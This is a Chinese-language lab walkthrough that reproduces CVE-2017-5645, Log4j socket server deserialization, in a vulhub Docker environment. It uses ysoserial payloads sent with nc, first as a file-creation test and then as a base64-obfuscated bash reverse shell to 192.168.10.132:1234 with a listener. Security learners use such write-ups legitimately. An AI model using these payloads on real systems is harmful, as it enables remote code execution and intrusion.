漏洞环境使用vulhub搭建，cve-2017-5645

进入路径

启动漏洞环境 dicker-compose up -d

可以看到已经在4712端口开放了TCPServer

然后使用ysoserial去利用，ysoserial是一款java反序列化利用工具。

github项目地址https://github.com/frohoff/ysoserial

下载源码之后然后去编译

需要的环境 ：Requires Java 1.7+ and Maven 3.x+
mvn clean package -DskipTests

或者可以直接下载别人打包好的jar包

https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

具体使用方法可以参考下面文章

https://johnfrod.top/%E5%B7%A5%E5%85%B7/ysoserial-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/

探测是否存在漏洞命令

java -jar ysoserial.jar CommonsCollections5 "touch /tmp/success" | nc your-ip 4712

然后进入到所起漏洞环境的shell之中，查看是否在tmp目录下已经创建了success文件。

docker-compose exec log4j bash

可以看到已经成功创建了success文件。

然后我们可以构造反弹shell的命令，进而拿到shell。

java ‐jar ysoserial.jar CommonsCollections5 "bash ‐c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjEzMi8xMjM0IDA+JjE=}|{base64,‐d}|{bash,‐i}" | nc 192.168.10.132 4712

使用该命令之后，然后在本地开启监听。

nc -lvvp 1234
